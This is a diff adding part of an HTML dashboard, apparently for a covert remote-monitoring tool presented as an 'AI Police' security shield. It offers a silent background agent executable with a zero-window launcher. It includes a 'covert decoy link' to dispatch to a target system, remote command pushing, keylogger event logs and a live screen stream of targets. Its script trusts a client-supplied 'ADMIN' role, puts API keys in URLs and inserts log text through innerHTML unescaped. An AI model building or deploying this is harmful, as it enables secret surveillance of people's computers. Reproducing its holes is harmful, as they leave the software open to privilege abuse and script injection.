+                    <h3 style="font-size: 28px; font-weight: 800; margin-top: 8px; color: var(--police-blue);" th:text="${totalBreaches}">12</h3>
+                </div>
+                <div class="card" style="padding: 20px;">
+                    <p style="font-size: 11px; color: var(--text-dim); text-transform: uppercase;">MONITORED SYSTEMS</p>
+                    <h3 style="font-size: 28px; font-weight: 800; margin-top: 8px; color: #a855f7;" th:text="${activeUsers}">2</h3>
+                </div>
+                <div class="card" style="padding: 20px;">
+                    <p style="font-size: 11px; color: var(--text-dim); text-transform: uppercase;">CRITICAL ALERTS</p>
+                    <h3 style="font-size: 28px; font-weight: 800; margin-top: 8px; color: var(--danger);" th:text="${criticalAlerts}">0</h3>
+                </div>
+                <div class="card" style="padding: 20px;">
+                    <p style="font-size: 11px; color: var(--text-dim); text-transform: uppercase;">LEGAL CLASSIFICATION</p>
+                    <h3 style="font-size: 28px; font-weight: 800; margin-top: 8px; color: var(--success);">SECURE SHIELD</h3>
+                </div>
+            </div>
+
+            <!-- Monitored systems table list -->
+            <div class="card" style="margin-bottom: 30px;">
+                <div class="card-header-custom">
+                    <h2 class="card-title-custom"><span class="dot" style="background:var(--police-blue); box-shadow:0 0 10px var(--police-blue);"></span> Monitored Security Nodes</h2>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>SYSTEM KEY ID</th>
+                                <th>IDENTIFIER / EMAIL</th>
+                                <th>LAST TELEMETRY PING</th>
+                                <th>SHIELD STATE</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr th:each="u : ${users}">
+                                <td th:text="${u.apiKey}" style="font-family:'JetBrains Mono', monospace; font-weight:700; color:var(--primary);">AB123XYZ</td>
+                                <td th:text="${u.email}">admin@guardian.com</td>
+                                <td th:text="${u.lastSeen != null ? #temporals.format(u.lastSeen, 'HH:mm:ss') : 'Never Active'}">10:48:32</td>
+                                <td>
+                                    <span th:if="${u.lastSeen != null and T(java.time.Duration).between(u.lastSeen, T(java.time.LocalDateTime).now()).toMinutes() < 2}" class="status-pill status-secure">ONLINE</span>
+                                    <span th:unless="${u.lastSeen != null and T(java.time.Duration).between(u.lastSeen, T(java.time.LocalDateTime).now()).toMinutes() < 2}" class="status-pill status-breach">OFFLINE</span>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Detailed alerts logs -->
+            <div class="card">
+                <div class="card-header-custom">
+                    <h2 class="card-title-custom"><span class="dot" style="background:var(--danger); box-shadow:0 0 10px var(--danger);"></span> AI Police Incident Logs</h2>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>TIMESTAMP</th>
+                                <th>TARGET NODE</th>
+                                <th>APPLICATION NAME</th>
+                                <th>ACTION EVENT</th>
+                                <th>SEVERITY</th>
+                                <th>FORENSIC PROOF</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr th:each="log : ${logs}">
+                                <td th:text="${#temporals.format(log.timestamp, 'yyyy-MM-dd HH:mm:ss')}" style="font-family:'JetBrains Mono', monospace; font-size:12px;">2024-05-18 10:48</td>
+                                <td th:text="${log.details}" style="font-weight:600;">Target-PC-1</td>
+                                <td th:text="${log.appName}" style="color:var(--primary); font-weight:700;">KOCKROACH</td>
+                                <td th:text="${log.action}">Remote keylogger trigger</td>
+                                <td>
+                                    <span th:class="${log.appName == 'KOCKROACH' ? 'status-pill status-breach' : 'status-pill status-secure'}" th:text="${log.appName == 'KOCKROACH' ? 'CRITICAL' : 'MITIGATED'}">
+                                        CRITICAL
+                                    </span>
+                                </td>
+                                <td>
+                                    <div th:if="${log.screenshotPath}">
+                                        <a th:if="${log.screenshotPath.endsWith('.jpg') or log.screenshotPath.endsWith('.png')}" th:href="@{'/api/screenshots/' + ${log.screenshotPath}}" target="_blank">
+                                            <img th:src="@{'/api/screenshots/' + ${log.screenshotPath}}" style="width: 80px; border-radius: 6px; border: 1px solid var(--border-glow); cursor:pointer;">
+                                        </a>
+                                        <div th:if="${log.screenshotPath.endsWith('.mp4')}">
+                                            <video width="120" controls style="border-radius: 6px; border: 1px solid var(--border-glow);">
+                                                <source th:src="@{'/api/screenshots/' + ${log.screenshotPath}}" type="video/mp4">
+                                            </video>
+                                        </div>
+                                    </div>
+                                    <span th:unless="${log.screenshotPath}" style="color:var(--text-dim); font-size: 12px;">No proof</span>
+                                </td>
+                            </tr>
+                            <tr th:if="${#lists.isEmpty(logs)}">
+                                <td colspan="6" style="text-align: center; padding: 40px; color: var(--text-dim);">No alerts logged by the AI protection shield.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== TAB 5: AGENT DEPLOYMENT ==================== -->
+        <div id="deploy-tab" class="tab-content">
+            <div class="dashboard-grid">
+                <div class="card">
+                    <div class="card-header-custom">
+                        <h2 class="card-title-custom"><span class="dot" style="background:#eab308; box-shadow:0 0 10px #eab308;"></span> Silent Monitoring Agent</h2>
+                    </div>
+                    <p style="font-size: 14px; color: var(--text-dim); line-height: 1.6; margin-bottom: 25px;">
+                        The **Silent Guardian Security Agent** runs silently as a background service on the client system. Once deployed, it audits running applications, logs process injections, and captures streams remotely without taking system UI windows focus.
+                    </p>
+                    
+                    <div style="background: rgba(0,0,0,0.3); border-radius: 12px; padding: 20px; border: 1px dashed rgba(255, 255, 255, 0.05); margin-bottom: 30px;">
+                        <h4 style="font-size:14px; margin-bottom:8px; color:#fff;">📦 Installation Package Contains:</h4>
+                        <ul style="font-size:13px; color:var(--text-dim); list-style:none; display:flex; flex-direction:column; gap:6px;">
+                            <li>• <code>3rd-AI-Agent.exe</code> (surveillance native binary compiler)</li>
+                            <li>• <code>config.json</code> (auto-assigned authentication key setup)</li>
+                            <li>• <code>Launch.vbs</code> (zero-window background execution runner)</li>
+                        </ul>
+                    </div>
+
+                    <a href="/3rd-AI-Agent.exe" class="btn-custom btn-primary-gradient" style="text-decoration:none; display:flex; width: 100%; text-align:center;">
+                        📥 Download 3rd-AI-Agent (.exe)
+                    </a>
+                </div>
+
+                <div class="card">
+                    <div class="card-header-custom">
+                        <h2 class="card-title-custom"><span class="dot"></span> Deployment Wizard Instructions</h2>
+                    </div>
+                    
+                    <div style="display:flex; flex-direction:column; gap:20px; font-size:14px; line-height:1.5;">
+                        <div style="display:flex; gap:15px;">
+                            <span style="background:var(--primary); color:#000; width:24px; height:24px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-weight:800; flex-shrink:0;">1</span>
+                            <div>
+                                <h4 style="font-weight:700; color:#fff;">Extract and Package</h4>
+                                <p style="color:var(--text-dim); font-size:12px; margin-top:2px;">Download the compiled 3rd-AI-Agent.exe and place it in a local directory.</p>
+                            </div>
+                        </div>
+                        <div style="display:flex; gap:15px;">
+                            <span style="background:var(--primary); color:#000; width:24px; height:24px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-weight:800; flex-shrink:0;">2</span>
+                            <div>
+                                <h4 style="font-weight:700; color:#fff;">Generate Token Links</h4>
+                                <p style="color:var(--text-dim); font-size:12px; margin-top:2px;">Paste your node protection API key into your client config.json properties.</p>
+                            </div>
+                        </div>
+                        <div style="display:flex; gap:15px;">
+                            <span style="background:var(--primary); color:#000; width:24px; height:24px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-weight:800; flex-shrink:0;">3</span>
+                            <div>
+                                <h4 style="font-weight:700; color:#fff;">Trigger Silent execution</h4>
+                                <p style="color:var(--text-dim); font-size:12px; margin-top:2px;">Double-click the runner batch Launch script. The terminal will shut immediately while the security system scanned threads persist.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script th:inline="javascript">
+        // Sidebar navigation switcher
+        function switchTab(tabId, clickedElement) {
+            // Hide all tab contents
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(c => c.classList.remove('active-tab'));
+
+            // Deactivate all sidebar buttons
+            const navs = document.querySelectorAll('.nav-item');
+            navs.forEach(n => n.classList.remove('active'));
+
+            // Show target tab
+            const targetTab = document.getElementById(tabId);
+            if (targetTab) {
+                targetTab.classList.add('active-tab');
+            }
+
+            // Highlight nav bar selector
+            if (clickedElement) {
+                clickedElement.classList.add('active');
+            } else {
+                // Find matching side nav element manually
+                const navItems = document.querySelectorAll('.nav-item');
+                navItems.forEach(item => {
+                    if (item.getAttribute('onclick') && item.getAttribute('onclick').includes(tabId)) {
+                        item.classList.add('active');
+                    }
+                });
+            }
+        }
+
+        // Send active command override (Admin only)
+        function sendCommand(action) {
+            const role = [[${role}]] || 'ADMIN';
+            const apiKey = [[${user.apiKey}]];
+            const targetId = [[${currentTarget}]] || 'ALL';
+            fetch(`/api/control?action=${action}&apiKey=${apiKey}&role=${role}&targetId=${targetId}`, { method: 'POST' })
+                .then(r => r.text())
+                .then(data => {
+                    if(data.includes("ERROR")) {
+                        alert('Unauthorized action: Only Admins can override commands!');
+                    } else {
+                        alert('System command pushed: ' + action);
+                    }
+                })
+                .catch(e => alert('Failed pushing control request: ' + e));
+        }
+
+        // Copy decoy link
+        function copyDecoyLink() {
+            var copyText = document.getElementById("decoyField");
+            copyText.select();
+            document.execCommand("copy");
+            alert("Covert decoy link copied! Dispatch it to target system.");
+        }
+
+        // Toggle Kavach active shield
+        function toggleKavach() {
+            const role = [[${role}]] || 'ADMIN';
+            const shieldBtn = document.getElementById('hubKavachBtn');
+            let isActivating = shieldBtn.innerText.includes('Enable');
+            
+            fetch(`/api/kavach/toggle?active=${isActivating}&role=${role}`, { method: 'POST' })
+                .then(r => r.text())
+                .then(data => {
+                    if(data.includes("UNAUTHORIZED")) {
+                        alert("Unauthorized Action: Only Root Admins can toggle security shield!");
+                    } else {
+                        verifyShieldState();
+                    }
+                });
+        }
+
+        // Poll security shield state
+        function verifyShieldState() {
+            fetch('/api/status')
+                .then(r => r.json())
+                .then(data => {
+                    const hubBtn = document.getElementById('hubKavachBtn');
+                    const labelBadge = document.getElementById('shieldLabel');
+                    const heartbeatNode = document.getElementById('heartbeatNode');
+                    const kavachPulseText = document.getElementById('kavachPulseText');
+
+                    if (data.kavachActive) {
+                        if(hubBtn) {
+                            hubBtn.innerText = '🛡️ Disable AI Kavach Shield';
+                            hubBtn.style.background = 'rgba(239, 68, 68, 0.1)';
+                            hubBtn.style.borderColor = 'rgba(239, 68, 68, 0.3)';
+                            hubBtn.style.color = 'var(--danger)';
+                        }
+                        if(labelBadge) {
+                            labelBadge.innerText = 'Shield Active';
+                            labelBadge.className = 'status-pill status-secure';
+                        }
+                        if(heartbeatNode) {
+                            heartbeatNode.style.borderColor = 'var(--success)';
+                            heartbeatNode.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.3)';
+                        }
+                        if(kavachPulseText) {
+                            kavachPulseText.innerText = 'Security Shield Engaged';
+                        }
+                    } else {
+                        if(hubBtn) {
+                            hubBtn.innerText = '🛡️ Enable AI Kavach Shield';
+                            hubBtn.style.background = 'rgba(16, 185, 129, 0.1)';
+                            hubBtn.style.borderColor = 'rgba(16, 185, 129, 0.3)';
+                            hubBtn.style.color = 'var(--success)';
+                        }
+                        if(labelBadge) {
+                            labelBadge.innerText = 'Shield Disabled';
+                            labelBadge.className = 'status-pill status-alert';
+                        }
+                        if(heartbeatNode) {
+                            heartbeatNode.style.borderColor = '#f59e0b';
+                            heartbeatNode.style.boxShadow = '0 0 20px rgba(245, 158, 11, 0.3)';
+                        }
+                        if(kavachPulseText) {
+                            kavachPulseText.innerText = 'Shield Offline';
+                        }
+                    }
+                });
+        }
+
+        // Live logs feed scroller polling
+        let loggedLines = 0;
+        function pollTelemetryLogs() {
+            fetch('/api/logs')
+                .then(r => r.json())
+                .then(logs => {
+                    const hubFeed = document.getElementById('liveFeedHub');
+                    if (logs.length > loggedLines) {
+                        for (let i = loggedLines; i < logs.length; i++) {
+                            const log = logs[i];
+                            const row = document.createElement('div');
+                            row.style.marginBottom = '6px';
+                            row.innerHTML = `<span style="color:#64748b;">[${new Date(log.timestamp).toLocaleTimeString()}]</span> <span style="color:var(--primary); font-weight:700;">${log.action}:</span> ${log.details}`;
+                            
+                            if (log.details.toLowerCase().includes("kockroach") || log.details.toLowerCase().includes("spy")) {
+                                row.style.color = 'var(--danger)';
+                                document.getElementById('kavachAlertBanner').style.display = 'block';
+                            }
+                            if(hubFeed) hubFeed.appendChild(row);
+                        }
+                        if(hubFeed) hubFeed.scrollTop = hubFeed.scrollHeight;
+                        loggedLines = logs.length;
+                    }
+                });
+        }
+
+        // Live visual refresh timer
+        verifyShieldState();
+        pollTelemetryLogs();
+
+        setInterval(verifyShieldState, 8000);
+        setInterval(pollTelemetryLogs, 3000);
+
+        // Screen refresh stream frames
+        setInterval(() => {
+            const screenFrame = document.getElementById('liveMonitorSrc');
+            const targetId = [[${currentTarget}]] || 'ALL';
+            if (screenFrame) {
+                screenFrame.src = '/api/live-stream?targetId=' + targetId + '&time=' + new Date().getTime();
+            }
+        }, 1500);
+    </script>
 </body>
 </html>
